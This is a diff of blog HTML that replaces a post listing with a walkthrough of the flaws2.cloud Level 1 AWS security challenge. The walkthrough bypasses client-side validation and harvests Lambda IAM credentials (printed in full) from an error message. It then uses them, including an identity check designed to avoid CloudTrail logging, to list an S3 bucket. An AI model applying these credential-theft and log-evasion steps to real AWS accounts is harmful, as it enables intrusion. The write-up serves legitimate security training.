@@ -4,34 +4,37 @@
     <meta name="generator" content="Hugo 0.56.3" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Posts | text/plain</title>
-    <meta name="description" content="Personal homepage of Dominic Breuker">
+    <title> | text/plain</title>
+    <meta name="description" content="Level 1 Explore the application Submit a valid PIN. IMG 01
+Submit invalid PIN -&gt; you get a Javascript error (client-side). What will the server do if you submit this? IMG 02
+Do do that quickly, locate the validation. Check out the page (curl http://level1.flaws2.cloud/index.htm), it is just inline JS:
+&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; ... &lt;body&gt; ... &lt;script type=&quot;text/javascript&quot;&gt; function validateForm() { var code = document.forms[&quot;myForm&quot;][&quot;code&quot;].value; if (!(!isNaN(parseFloat(code)) &amp;&amp; isFinite(code))) { alert(&quot;Code must be a number&quot;); return false; } } &lt;/script&gt; .">
     <meta name="keywords" content="aws, hackthebox, misc, steganography, ">
     
     
     
-    
-      <meta name="robots" content="noindex">
     
     
 
   <meta name="author" content="Dominic Breuker">
 
 
-    <meta property="og:title" content="Posts" />
-<meta property="og:description" content="Personal homepage of Dominic Breuker" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://dominicbreuker.com/post/" />
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Level 1 Explore the application Submit a valid PIN. IMG 01
+Submit invalid PIN -&gt; you get a Javascript error (client-side). What will the server do if you submit this? IMG 02
+Do do that quickly, locate the validation. Check out the page (curl http://level1.flaws2.cloud/index.htm), it is just inline JS:
+&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; ... &lt;body&gt; ... &lt;script type=&quot;text/javascript&quot;&gt; function validateForm() { var code = document.forms[&quot;myForm&quot;][&quot;code&quot;].value; if (!(!isNaN(parseFloat(code)) &amp;&amp; isFinite(code))) { alert(&quot;Code must be a number&quot;); return false; } } &lt;/script&gt; ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/20_flaws2_cloud_1/" />
 
 <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
 
-<meta property="og:updated_time" content="2019-11-28T00:00:00+01:00" />
 
     
 
+
+
   <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
-
-
 
 
     <meta name="theme-color" content="#000">
@@ -39,9 +42,7 @@
     
     
     
-      <link href="https://dominicbreuker.com/post/index.xml" rel="alternate" type="application/rss+xml" title="text/plain" />
-    
-    <link rel="canonical" href="https://dominicbreuker.com/post/">
+    <link rel="canonical" href="https://dominicbreuker.com/post/20_flaws2_cloud_1/">
     
     
     <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
@@ -221,161 +222,26 @@ figure a:hover {
 
 </header>
     <main>
-  <header>
-    <h1>Posts</h1>
-  </header>
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/flaws_cloud_lvl1/">flaws.cloud - Level 1</a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <circle cx="16" cy="16" r="14" />
-  <path d="M16 8 L16 16 20 20" />
-</svg>
-<span>6 minute read</span>
-<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
-</svg>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="">
+<meta itemprop="description" content="Level 1 Explore the application Submit a valid PIN. IMG 01
+Submit invalid PIN -&gt; you get a Javascript error (client-side). What will the server do if you submit this? IMG 02
+Do do that quickly, locate the validation. Check out the page (curl http://level1.flaws2.cloud/index.htm), it is just inline JS:
+&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; ... &lt;body&gt; ... &lt;script type=&quot;text/javascript&quot;&gt; function validateForm() { var code = document.forms[&quot;myForm&quot;][&quot;code&quot;].value; if (!(!isNaN(parseFloat(code)) &amp;&amp; isFinite(code))) { alert(&quot;Code must be a number&quot;); return false; } } &lt;/script&gt; .">
 
-  Published: <time datetime="2018-08-21T00:00:00&#43;02:00">21 Aug, 2018</time>
 
-</p>
-    
-  </header>
-  
-    <blockquote itemprop="headline">flAWS.cloud is a set of CTF-like challenges that teach you common security issues in AWS accounts. This post is the first of a series of walkthroughs for these challenges. It&#39;s basically a short writeup on how to solve level 1, followed by a brief explanation of the AWS configuration that leads to this flaw and how to mitigate it. Before reading, go [here](http://flaws.cloud/) and try yourself first! ;)</blockquote>
-  
-  <div itemprop="description">
-    Adoption of cloud computing is rising rapidly. Studies predict it will soon surpass on-premises hosting also for enterprise workloads. Large corporates are hesitant mostly due to security concerns, which are partly of more general nature (&ldquo;uploading data to the cloud&rdquo;), but also due to the myriad of cloud security failures you read about every day in the news. For example, many companies misconfigure AWS S3 bucket permissions and leave sensitive data unprotected.
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/flaws_cloud_lvl1/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="2018-08-21T00:00:00&#43;02:00">
-  <meta itemprop="dateModified" content="2018-08-21T00:00:00&#43;02:00">
-  
-</article>
 
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/stego_book_of_secrets/">Steganography challenge - The Book of Secrets</a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <circle cx="16" cy="16" r="14" />
-  <path d="M16 8 L16 16 20 20" />
-</svg>
-<span>10 minute read</span>
-<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
-</svg>
+<meta itemprop="wordCount" content="801">
 
-  Published: <time datetime="2018-02-01T00:00:00&#43;01:00">1 Feb, 2018</time>
 
-</p>
-    
-  </header>
-  
-    <blockquote itemprop="headline">A small steganography challenge illustrating basic tricks used to hide data inside images. This post introduces the challenge, walks you through the soliution, and ends by describing how the challenge was created. The solution involves some basic JPG image screening, hexedit surgery, and password cracking with custom wordlists.</blockquote>
-  
-  <div itemprop="description">
-    Steganography is the practice of hiding information inside other media like images, audio or video files, text, or pretty much anything else. It is different from encryption in that it aims not at making information unreadable but at concealing the very fact that it is there. Steganography and steganalysis (detection of steganography) are long-standing fields of research. Overviews of the field can be found, e.g., in Subhedar/Mankar (2014) or Zielińska/Mazurczyk/Szczypiorski (2014).
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/stego_book_of_secrets/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="2018-02-01T00:00:00&#43;01:00">
-  <meta itemprop="dateModified" content="2018-02-01T00:00:00&#43;01:00">
-  
-</article>
 
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <circle cx="16" cy="16" r="14" />
-  <path d="M16 8 L16 16 20 20" />
-</svg>
-<span>12 minute read</span>
-<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
-</svg>
+<meta itemprop="keywords" content="" />
 
-  Published: <time datetime="2018-01-30T00:00:00&#43;01:00">30 Jan, 2018</time>
-
-</p>
-    
-  </header>
-  
-    <blockquote itemprop="headline">Write-up for the machine SolidState from Hack The Box. Requires thorough port scanning to find an esoteric telnet admin interface of the Apache James email server. With default root credentials, you become James admin and break into people&#39;s email inboxes. Inside, you find SSH credentials, bypass a restricted shell and finally find an insecure cron job to escalate to root.</blockquote>
-  
-  <div itemprop="description">
-    This is my second write-up for a machine from Hack The Box. It is again a rather easy one but still lots of fun. Lots of opportunities to do some oldschool telnet work on email servers. It starts with port scanning and illustrates the importance of scanning also more unpopular ports. After finding the email server with default credentials, you must use your administrator power to get code execution. Once on the box, all you have to do is finding an insecure cron job and you are root.
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/htb_solidstate/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="2018-01-30T00:00:00&#43;01:00">
-  <meta itemprop="dateModified" content="2018-01-30T00:00:00&#43;01:00">
-  
-</article>
-
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <circle cx="16" cy="16" r="14" />
-  <path d="M16 8 L16 16 20 20" />
-</svg>
-<span>10 minute read</span>
-<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
-</svg>
-
-  Published: <time datetime="2018-01-26T00:00:00&#43;01:00">26 Jan, 2018</time>
-
-</p>
-    
-  </header>
-  
-    <blockquote itemprop="headline">Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root.</blockquote>
-  
-  <div itemprop="description">
-    Hack The Box is a new company offering lab servers you can test penetration testing techniques on. It is quite educative and a lot of fun. They have multiple machines and all follow a similar pattern. You start with an IP address, have to find a way to get code execution on the machine (usually as an unprivileged user) and have to escalate from there to root. This post is about one of the machines called calamity.
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/htb_calamity/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="2018-01-26T00:00:00&#43;01:00">
-  <meta itemprop="dateModified" content="2018-01-26T00:00:00&#43;01:00">
-  
-</article>
-
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/20_flaws2_cloud_1/"></a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline"></h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
@@ -386,112 +252,248 @@ figure a:hover {
 
   Published: <time datetime="0001-01-01T00:00:00&#43;00:00">1 Jan, 0001</time>
 
+
+      </p>
+    </header>
+    
+    
+
+    <div itemprop="articleBody">
+      
+
+<h1 id="level-1">Level 1</h1>
+
+<h2 id="explore-the-application">Explore the application</h2>
+
+<p>Submit a valid PIN.
+IMG 01</p>
+
+<p>Submit invalid PIN -&gt; you get a Javascript error (client-side).
+What will the server do if you submit this?
+IMG 02</p>
+
+<p>Do do that quickly, locate the validation.
+Check out the page (<code>curl http://level1.flaws2.cloud/index.htm</code>), it is just inline JS:</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+...
+&lt;body&gt;
+    ...
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        function validateForm() {
+            var code = document.forms[&quot;myForm&quot;][&quot;code&quot;].value;
+            if (!(!isNaN(parseFloat(code)) &amp;&amp; isFinite(code))) {
+                alert(&quot;Code must be a number&quot;);
+                return false;
+            }
+        }
+    &lt;/script&gt;
+    ...
+    &lt;form name=&quot;myForm&quot; action=&quot;https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1&quot; onsubmit=&quot;return validateForm()&quot;&gt;
+        Code: &lt;input type=&quot;text&quot; name=&quot;code&quot; value=&quot;1234&quot;&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+    &lt;/form&gt;
+    ...
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>In the HTML code you can see that the form will submit data to AWS.
+The URL indicates that the functionality is hosted behind API gateway
+(Lambda?).
+For now only the <code>onsubmit</code> function is relevant.
+The browser executes <code>validateForm()</code>, which was defined above the form as
+inline JS.
+We can see that data that can be parsed into a number is allowed.</p>
+
+<h2 id="submit-invalid-data">Submit invalid data</h2>
+
+<p>To change it just rewrite the function.
+We want <code>function validateForm() { return true; }</code> so that any data will pass.
+Put this into your developer console and hit enter:
+IMG 03.</p>
+
+<p>Now you get some interesting output:
+IMG 04</p>
+
+<p>You can also get the output in your console with this request: <code>curl -s https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=abc | tail -n -1 | jq</code></p>
+
+<p>The output is as follows:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
+  <span style="color: #f92672">&quot;PATH&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;LD_LIBRARY_PATH&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;LANG&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;en_US.UTF-8&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;TZ&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;:UTC&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;LAMBDA_TASK_ROOT&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;/var/task&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;LAMBDA_RUNTIME_DIR&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;/var/runtime&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_REGION&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;us-east-1&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_DEFAULT_REGION&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;us-east-1&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_LAMBDA_LOG_GROUP_NAME&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;/aws/lambda/level1&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_LAMBDA_LOG_STREAM_NAME&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2019/11/20/[$LATEST]4cf25aac692c4bddb1adea113b687bed&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_LAMBDA_FUNCTION_NAME&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;level1&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_LAMBDA_FUNCTION_MEMORY_SIZE&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;128&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_LAMBDA_FUNCTION_VERSION&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;$LATEST&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;_AWS_XRAY_DAEMON_ADDRESS&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;169.254.79.2&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;_AWS_XRAY_DAEMON_PORT&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2000&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_XRAY_DAEMON_ADDRESS&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;169.254.79.2:2000&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_XRAY_CONTEXT_MISSING&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;LOG_ERROR&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;_X_AMZN_TRACE_ID&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Root=1-5dd575c1-5c8474644a8d10ff8f61a7bd;Parent=1228751e55f1a6c6;Sampled=0&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_EXECUTION_ENV&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;AWS_Lambda_nodejs8.10&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;_HANDLER&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;index.handler&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;NODE_PATH&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_ACCESS_KEY_ID&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;ASIAZQNB3KHGI74XHSXT&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_SECRET_ACCESS_KEY&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;6eIXCPRIC6rfUvxT6iZEKyq0zi/9V9wsexPtDJNP&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;AWS_SESSION_TOKEN&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;IQoJb3JpZ2luX2VjELH//////////wEaCXVzLWVhc3QtMSJGMEQCIG9DBkunq6KzhwqPlvwxn6ML9NT0AovQ1+KPWRFvjNswAiAf9/NxtygFGTe+dJ80L9eS8GbCpLsufF2viUysJIKrrSrOAQjZ//////////8BEAEaDDY1MzcxMTMzMTc4OCIMT3SZV7Arxe137ZllKqIBeF/aO78SncfAhIsy3iehEsQomtGL1l+eD+qgivxd+6OTZhHV7hUlv0luFBcFMYYzaIajAxuWJWldGYUiARaI1YaqTisnY32dxsNC7WdHs/9Op6Rc1eImhgih66zzBDfNrIY+OdpGHLvS8X+uUuulvjPy5pF51oa/zt1At0MyPBLFQjH1317l+ADel9bp+M8nWjEHogbf2SwTnNdxZMDyJ5QyMJDI1e4FOuEBytAthIvfI0DOYdt998UwHgPqAK5SwSOYmts7/rVK6S6B5L6WxSPpqSx8Dx+UcfM2TMqGWw9vuamLcT3rJAU4oVuGsVcdWPMAGQP/Bm4ZwjZPEjQFYEOk9MOZkyCJW5Brt0RV7M/CAtcDQ6K4uV7r6Mn1Fp8fzPIseXSjmAMaVlef3ID8cSrGudiNHjzRsjmMlF5AeE/XIMaVJ/upUZp8HTzyqmb5zroFv14fcBCbKdC3+XwuSmG8YawhUXbwQBfywl/4tavUMtJ3NaOW0D4pwPypN726b5fu53+otCVdpgBU&quot;</span>
+<span style="color: #f8f8f2">}</span>
+</code></pre></div>
+
+<p>Whooo, this is quite a verbose error message.
+It looks a lot like the API indeed runs in AWS Lambda.
+The <code>_HANDLER</code> env var indicates the lambda handler.
+<code>NODE_PATH</code> suggests it is written in Node.js.
+Also: <code>&quot;AWS_EXECUTION_ENV&quot;: &quot;AWS_Lambda_nodejs8.10&quot;</code>.</p>
+
+<p>Most importantly, we find the temporary IAM credentials for the lambda.
+Source them into your shell and you are good to go for enumeration:</p>
+
+<pre><code> # export AWS_ACCESS_KEY_ID=ASIAZQNB3KHGI74XHSXT
+ # export AWS_SECRET_ACCESS_KEY=6eIXCPRIC6rfUvxT6iZEKyq0zi/9V9wsexPtDJNP
+ # export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELH//////////wEaCXVzLWVhc3QtMSJGMEQCIG9DBkunq6KzhwqPlvwxn6ML9NT0AovQ1+KPWRFvjNswAiAf9/NxtygFGTe+dJ80L9eS8GbCpLsu
+fF2viUysJIKrrSrOAQjZ//////////8BEAEaDDY1MzcxMTMzMTc4OCIMT3SZV7Arxe137ZllKqIBeF/aO78SncfAhIsy3iehEsQomtGL1l+eD+qgivxd+6OTZhHV7hUlv0luFBcFMYYzaIajAxuWJWldGYUiAR
+aI1YaqTisnY32dxsNC7WdHs/9Op6Rc1eImhgih66zzBDfNrIY+OdpGHLvS8X+uUuulvjPy5pF51oa/zt1At0MyPBLFQjH1317l+ADel9bp+M8nWjEHogbf2SwTnNdxZMDyJ5QyMJDI1e4FOuEBytAthIvfI0DO
+Ydt998UwHgPqAK5SwSOYmts7/rVK6S6B5L6WxSPpqSx8Dx+UcfM2TMqGWw9vuamLcT3rJAU4oVuGsVcdWPMAGQP/Bm4ZwjZPEjQFYEOk9MOZkyCJW5Brt0RV7M/CAtcDQ6K4uV7r6Mn1Fp8fzPIseXSjmAMaVl
+ef3ID8cSrGudiNHjzRsjmMlF5AeE/XIMaVJ/upUZp8HTzyqmb5zroFv14fcBCbKdC3+XwuSmG8YawhUXbwQBfywl/4tavUMtJ3NaOW0D4pwPypN726b5fu53+otCVdpgBU
+</code></pre>
+
+<p>Confirm your identity with the AWS whoami:</p>
+
+<pre><code> # aws sts get-caller-identity
+{
+    &quot;UserId&quot;: &quot;AROAIBATWWYQXZTTALNCE:level1&quot;,
+    &quot;Account&quot;: &quot;653711331788&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::653711331788:assumed-role/level1/level1&quot;
+}
+</code></pre>
+
+<p>Instead we could also use the info leak from a service not supporting
+CloudTrail to confirm the identity in a stealthy way.
+The list is <a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html">here</a>
+and at the time of writing AWS Connect is not supported.
+We can make a request and the error will tell us who we are and that we are not
+allowed to do it:</p>
+
+<pre><code> # aws connect list-users --instance-id anything
+
+An error occurred (AccessDeniedException) when calling the ListUsers operation: User: arn:aws:sts::653711331788:assumed-role/level1/level1 is not authorized to perform: connect:ListUsers on resource: arn:aws:connect:us-east-1:653711331788:instance/anything
+</code></pre>
+
+<p>We get the same output. Note that both ways leaked the AWS account ID &ldquo;653711331788&rdquo;.
+Note it down since we will need it later for other levels.</p>
+
+<h2 id="enumerate-with-credentials">Enumerate with credentials</h2>
+
+<p>From the URL of API gateway we know the region we use below should always be <code>us-east-1</code>.
+Set it by default with <code>export AWS_DEFAULT_REGION=us-east-1</code>.</p>
+
+<p>We want to know the PIN so anything that gets us closer to the Lambdas source
+code is good:</p>
+
+<ul>
+<li>Can we list lambdas? &ndash;&gt; <code>aws lambda list-functions</code> &ndash;&gt; no :(</li>
+<li>Can we know more about this specific Lamba, named <code>level1</code> as we know from the
+error messages? &ndash;&gt; <code>aws lambda get-function --function-name level1</code> &ndash;&gt; no</li>
+<li>Can we at least write log messages into the stream that is configured? &ndash;&gt; <code>$ aws logs put-log-events --log-group-name '/aws/lambda/level1' --log-stream-name '2019/11/20/[$LATEST]4cf25aac692c4bddb1adea113b687bed' --log-events timestamp=1433190184356,message=hello-world</code> &ndash;&gt; no</li>
+</ul>
+
+<p>Not even the last thing works, which is something the Lambda should actually be
+able to do. Maybe this is not it.</p>
+
+<p>Lets find out more about the page.
+What runs the page, S3 maybe?
+Get the IP:</p>
+
+<pre><code> # dig level1.flaws2.cloud ANY
+...
+level1.flaws2.cloud.    4       IN      A       52.216.169.226
+...
+</code></pre>
+
+<p>Then check PTR:</p>
+
+<pre><code> # dig -x 52.216.169.226
+...
+226.169.216.52.in-addr.arpa. 899 IN     PTR     s3-website-us-east-1.amazonaws.com.
+...
+</code></pre>
+
+<p>So it is S3.</p>
+
+<p>Lets list the bucket:</p>
+
+<pre><code> # aws s3 ls s3://level1.flaws2.cloud
+                           PRE img/
+2018-11-20 21:55:05      17102 favicon.ico
+2018-11-21 03:00:22       1905 hint1.htm
+2018-11-21 03:00:22       2226 hint2.htm
+2018-11-21 03:00:22       2536 hint3.htm
+2018-11-21 03:00:23       2460 hint4.htm
+2018-11-21 03:00:17       3000 index.htm
+2018-11-21 03:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+</code></pre>
+
+<p>This is all we need&hellip; Strange, since the level description mentioned nothing.
+Indeed we check out hint 4 we find the PIN:</p>
+
+<pre><code> $ curl -s http://level1.flaws2.cloud/hint4.htm | grep PIN
+            &lt;p&gt;Not that it matters, and you wouldn't be able to find it anyway, but the correct PIN is &lt;tt&gt;2655422448894239998663248672866499665886429463578833452866744743685543463822468584853334496394632499&lt;/tt&gt;
+</code></pre>
+
+<h1 id="the-flaw">The flaw</h1>
+
+<h2 id="client-side-validation">Client-side validation</h2>
+
+<p>Application did not handle errors appropriately.
+Nobody notices since client-side validation means no ordinary user ever
+triggers the bug.</p>
+
+<h2 id="verbose-error-messages">Verbose error messages</h2>
+
+<p>There should not be environment variables in error messages outside of
+development stages.</p>
+
+<h2 id="least-privilege">Least privilege</h2>
+
+<p>The application should not be able to access the bucket.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="0001-01-01T00:00:00&#43;00:00">
+    1 Jan, 0001
+  </time>
+  
+  
+  using <span itemprop="wordCount">801</span> words.
 </p>
-    
-  </header>
-  
-  <div itemprop="description">
-    Level 1 Explore the application Submit a valid PIN. IMG 01
-Submit invalid PIN -&gt; you get a Javascript error (client-side). What will the server do if you submit this? IMG 02
-Do do that quickly, locate the validation. Check out the page (curl http://level1.flaws2.cloud/index.htm), it is just inline JS:
-&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; ... &lt;body&gt; ... &lt;script type=&quot;text/javascript&quot;&gt; function validateForm() { var code = document.forms[&quot;myForm&quot;][&quot;code&quot;].value; if (!(!isNaN(parseFloat(code)) &amp;&amp; isFinite(code))) { alert(&quot;Code must be a number&quot;); return false; } } &lt;/script&gt; .
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/20_flaws2_cloud_1/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="0001-01-01T00:00:00&#43;00:00">
-  <meta itemprop="dateModified" content="0001-01-01T00:00:00&#43;00:00">
-  
-</article>
 
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/21_flaws2_cloud_2/"></a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <circle cx="16" cy="16" r="14" />
-  <path d="M16 8 L16 16 20 20" />
-</svg>
-<span>6 minute read</span>
-<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
-</svg>
+      
 
